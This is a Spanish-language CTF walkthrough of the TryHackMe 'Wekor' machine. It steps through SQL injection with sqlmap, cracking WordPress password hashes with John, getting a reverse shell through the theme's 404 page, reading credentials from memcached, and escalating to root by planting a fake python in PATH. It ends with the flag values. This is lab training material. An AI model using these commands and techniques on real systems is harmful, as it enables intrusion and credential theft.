@@ -1,0 +1,160 @@
+>>> Tryhackme
+>> Wekar 1.0
+
+Descripción:
+
+En la información de la máquina, encontramos la ruta "wekor.htm", por lo que debemos colocarla en /etc/hosts.
+
+nano /etc/hosts
+
+Dentro, pegamos la IP y la relacionamos con "wekor.thm":
+
+10.10.129.117    wekor.thm
+
+Nmap:
+
+- Puerto 22/tcp abierto - SSH OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocolo 2.0)
+- Puerto 80/tcp abierto - HTTP Apache httpd 2.4.18 ((Ubuntu))
+  - Métodos HTTP soportados: GET HEAD POST OPTIONS
+  - http-title: El sitio no tiene un título (text/html).
+  - http-server-header: Apache/2.4.18 (Ubuntu)
+  - robots.txt: 9 entradas deshabilitadas:
+    /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
+    /comingreallysoon /interesting
+
+Dentro del puerto 80, encontramos robots.txt con varios enlaces, destacando "/comingreallysoon" que nos dirige a "/it-next".
+
+- /it-next: Aparentemente, una página de venta de periféricos.
+
+Al abrir un producto, encontramos un input de "apply coupon", donde al introducir "'" nos da un error:
+
+"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1"
+
+Esto indica una mala sanitización de SQL, por lo tanto, es vulnerable a SQL Injection y nos indican que la base de datos es MySQL. Procedemos a utilizar sqlmap para hacer un dump de la base de datos.
+
+Abrimos "Burpsuite", interceptamos la petición web y la guardamos en un archivo .txt llamado "sql.txt". Lo utilizaremos para que sqlmap funcione correctamente.
+
+sqlmap -r sql.txt --dbms=mysql -dbs
+
+Ahora, utilizaremos gobuster para buscar un posible subdominio de WordPress:
+
+gobuster vhost -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://wekor.htm
+
+Encontramos un subdominio llamado "site.wekor.thm". Modificamos /etc/hosts para vincular los enlaces.
+
+nano /etc/hosts
+
+Dentro del enlace, encontramos un texto que nos da a entender que el sitio estará listo pronto y que hay un usuario "jim". Procedemos a hacer fuzzing nuevamente.
+
+gobuster dir -u http://site.wekor.thm -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
+
+Encontramos un login apto para intentar entrar. Volveremos a la base de datos donde vimos una tabla "wordpress" para así poder dumpear y ver si encontramos usuarios.
+
+sqlmap -r sql.txt --dbms=mysql -D wordpress --tables --batch
+
+Ahora, vemos la tabla "wp_users":
+
+sqlmap -r sql.txt --dbms=mysql -D wordpress -T wp_users --columns --batch
+
+Dentro de "user_login" y "user_pass":
+
+sqlmap -r sql.txt --dbms=mysql -D wordpress -T wp_users -C user_login,user_pass --dump --batch
+
+Ahora, con las credenciales, podemos entrar al WordPress y crear una reverseshell para acceder al servidor.
+
+Ingresamos con admin y modificamos la página donde aparecería el 404 para poder ganar acceso.
+
+Guardamos las credenciales con sus respectivos hashes en una carpeta, luego los desencriptamos con John.
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+
+Las credenciales que encontramos son:
+
+- rockyou:wp_jeffrey
+- xxxxxx:wp_eagle
+- soccer13:wp_yura
+
+No encontramos la contraseña de admin (:C), así que usaremos las que tenemos y procederemos a modificar el encabezado de 404 de WordPress, reemplazándolo con una reverseshell para ganar acceso al servidor.
+
+La ruta del 404 es la siguiente:
+
+http://site.wekor.thm/wordpress/wp-content/themes/twentytwentyone/404.php
+
+Dentro del servidor, y habiendo hecho el tratamiento de la tty:
+
+script /dev/null -c bash
+control+z
+stty raw -echo: fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+
+Buscamos dentro del servidor y vemos que todo necesita permisos de root, así que veremos qué servicios se ejecutan de forma interna en la máquina.
+
+netstat -nat
+
+Vemos que se está ejecutando de forma local por el puerto 11211 el servicio "tcp/upd". Ingresaremos vía telnet a ese servicio.
+
+telnet 127.0.0.1 11211
+
+Ahora, necesitamos ciertos comandos que desconocemos. En la siguiente página encontramos una guía:
+
+- https://www.hackingarticles.in/penetration-testing-on-memcached-server/
+
+Con el comando "stats cachedump 1 0" obtenemos información:
+
+stats cachedump 1 0
+
+Y con el comando "get" traemos el contenido:
+
+get password
+get username
+
+Con las credenciales obtenidas, hacemos sudo y vemos que podemos ejecutar /home/Orka/Desktop/bitcoin como root.
+
+Al querer ejecutar "bitcoin" como root, nos pide una contraseña, la cual no tenemos. Podemos utilizar "ltrace" para poder ver cómo funciona el código por detrás.
+
+ltrace /home/Orka/Desktop/bitcoin
+
+Al colocar un password random, vemos que este es comparado con "password", por lo tanto, el pass correcto es "password".
+
+sudo /home/Orka/Desktop/bitcoin
+
+Vemos que el programa "bitcoin" aparenta una transferencia de bitcoin y ejecuta un script en python llamado "transfer.py".
+
+No tenemos permisos de escritura sobre "transfer.py", así que apuntaremos directamente a Python para escalar privilegios. Para esto, debemos saber cuál es la forma en la que se buscan los archivos, y para esto es útil "echo $PATH".
+
+echo $PATH
+
+Aquí podemos ver la ruta en la que se buscan archivos, por lo tanto, debemos colocar nuestro script dentro de "/usr/sbin".
+
+nano python
+
+El archivo incluirá el siguiente código:
+
+#!/bin/bash
+/bin/bash
+
+Ahora movemos el archivo a la carpeta "/usr/sbin":
+
+mv python /usr/sbin
+
+Damos privilegios de ejecución:
+
+chmod +x python
+
+Ahora ejecutamos el script "bitcoin":
+
+sudo /home/Orka/Desktop/bitcoin
+
+Y ya somos root :D
+
+Ahora a buscar las flags.
+
+find / -name "user.txt" 2>/dev/null
+cat /home/Orka/user.txt
+•1a26a6d51c0172400add0e297608dec6
+
+find / -name "root.txt" 2>/dev/null
+cat /root/root.txt
+•f4e788f87cc3afaecbaf0f0fe9ae6ad7
